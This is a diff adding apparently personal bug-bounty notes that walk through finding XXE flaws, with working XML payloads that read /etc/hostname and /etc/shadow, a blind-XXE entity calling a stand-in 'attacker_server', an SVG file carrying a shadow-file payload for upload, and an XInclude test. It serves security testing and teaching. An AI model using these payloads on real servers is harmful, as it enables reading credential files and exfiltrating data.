@@ -1,0 +1,94 @@
+- To find XXEs, start with locating the functionalities that are prone to them. This includes anywhere that the application receives direct XML input, or receives input that is inserted into XML documents that the application parses.
+
+- Step 1: Find XML Data Entry Points:
+	
+- Many applications use XML data to transfer information within HTTP messages. To look for these endpoints, you can open up your proxy and browse the target application. Then, find XML-like documents in HTTP messages by looking for the previously mentioned tree-like structures, or by looking for the signature of an XML document: the string "<?xml".
+Keep an eye out for encoded XML data in the application as well. Sometimes applications use base64- or URL-encoded XML data for ease of transportation. You can find these XML entry points by decoding any blocks of data that look suspicious. For example, a base64-encoded block
+of XML code tends to start with LD94bWw, which is the base64-encoded string of "<?xml". Besides searching for XML within HTTP messages, you should also look for file-upload features. This is because XML forms the basis of many common file types. 
+
+- If you can upload one of these file types, you might be able to smuggle XML input to the application’s XML parser. XML can be written into document and image formats like XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, and RSS feeds. Furthermore, metadata embedded within images like GIF, PNG, and JPEG files are all based on XML. SOAP web services are also XML based. In addition to looking for locations where the application accepts XML data by default, you can try to force the application into parsing XML data.
+
+- Sometimes endpoints take plaintext or JSON input by default but can process XML input as well. On endpoints that take other formats of input, you can modify the Content-Type header of your request to one of the following
+headers:
+Content-Type: text/xml
+Content-Type: application/xml
+
+- Then, try to include XML data in your request body. Sometimes this is all it takes to make the target application parse your XML input. Finally, some applications receive user-submitted data and embed it into an XML document on the server side. If you suspect that is happening, you can submit an XInclude test payload to the endpoint
+
+
+- Step 2: Test for Classic XXE:
+
+- You can start to test for the presence of functionalities needed for XXE attacks. This usually involves sending a few trial-and-error XXE payloads and observing the application’s response. If the application is returning results from the parser, you might be able to carry out a classic XXE attack—that is, you can read the leaked files directly from the server’s response. To search for classic XXEs, first check whether XML entities are interpreted by inserting XML entities into the XML input and see if it loads properly:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "Hello!">
+]>
+<example>&test;</example>
+
+- Then, test whether the SYSTEM keyword is usable by trying to load a local file:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "file:///etc/hostname">
+]>
+<example>&test;</example>
+
+- When the SYSTEM keyword does not work, you can replace it with the PUBLIC keyword instead. This tag requires you to supply an ID surrounded by quotes after the PUBLIC keyword. The parser uses this to generate an alternate URL for the value of the entity. For our purposes, you can just use a random string in its place:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test PUBLIC "abc" "file:///etc/hostname">
+]>
+<example>&test;</example>
+
+- Next, try to extract some common system files. You can start with the files /etc/hostname and /etc/passwd, for example. Another file I like to extract using XXEs is .bash_history. This file is typically located at each user’s home directory (~/.bash_history) and contains a list of commands previously executed. By reading this file, you can often uncover juicy information like internal URLs, IP addresses, and file locations. Common system files or paths mentioned here can be restricted, so don’t give up if the first few files you try to read do not display.
+
+- Step 3: Test for Blind XXE: 
+
+- If the server takes XML input but does not return the XML document in an HTTP response, you can test for a blind XXE instead. Instead of reading files from the server’s response, most blind XXE attacks steal data by having the target server make a request to the attacker’s server with the exfiltrated
+information.
+
+- First, you need to make sure that the server can make outbound connections by having the target make a request to your server. You can set up a callback listener The process for setting up a listener to discover XXEs is the same as setting up to find SSRFs. Try making an external entity load a resource on your machine. To bypass common firewall restrictions, you should test with ports 80 and 443 first, because the target’s firewall might not allow outbound connections on other ports:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
+]>
+<example>&test;</example>
+
+- You can then search the access logs of your server and look for a request to that particular file. In this case, you’ll be looking for a GET request for the
+xxe_test.txt file. Once you’ve confirmed that the server can make outbound requests, you can try to exfiltrate files
+
+- Step 4: Embed XXE Payloads in Different File Types:
+
+- Besides testing for XXEs on HTTP request bodies, you can try to upload files containing XXE payloads to the server. File-upload endpoints and file parsers are often not protected by the same XXE protection mechanisms as regular endpoints. And hiding your XXE payloads in different file types means that you will be able to upload your payloads even if the application restricts the type of files that can be uploaded.
+
+- This section presents just a few examples of how to embed XXE payloads in various file types. You should be able to find more examples by
+searching the internet.
+
+- To embed an XXE payload in an SVG image, you need to first open up the image as a text file. Take this SVG image of a blue circle, for example:
+<svg width="500" height="500">
+<circle cx="50" cy="50" r="40" fill="blue" />
+</svg>
+
+- Insert the XXE payload by adding a DTD directly into the file and referencing the external entity in the SVG image. You can then save the file as an .svg file and upload it to the server:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE example [
+<!ENTITY test SYSTEM "file:///etc/shadow">
+]>
+<svg width="500" height="500">
+<circle cx="50" cy="50" r="40" fill="blue" />
+<text font-size="16" x="0" y="16">&test;</text>
+</svg>
+
+- Microsoft Word documents (.docx files), PowerPoint presentations (.pptx), and Excel worksheets (.xlxs) are archive files containing XML files,
+so you can insert XXE payloads into them as well. To do so, you should first unzip the document file. For example, I used the Unarchiver software on a Mac to extract the files.
+
+- Step 5: Test for XInclude Attacks:
+
+- Sometimes you cannot control the entire XML document or edit the DTD of an XML document. But you can still exploit an XXE vulnerability if the target application takes your user input and inserts it into XML documents on the backend.
+
+- In this situation, you might be able to execute an XInclude attack instead. XInclude is a special XML feature that builds a separate XML document from a single XML tag named xi:include. If you can control even a single piece of unsanitized data passed into an XML document, you might be able to place an XInclude attack within that value.
+
+- To test for XInclude attacks, insert the following payload into the data entry point and see if the file that you requested gets sent back in the response body:
+<example xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/hostname"/>
+</example>
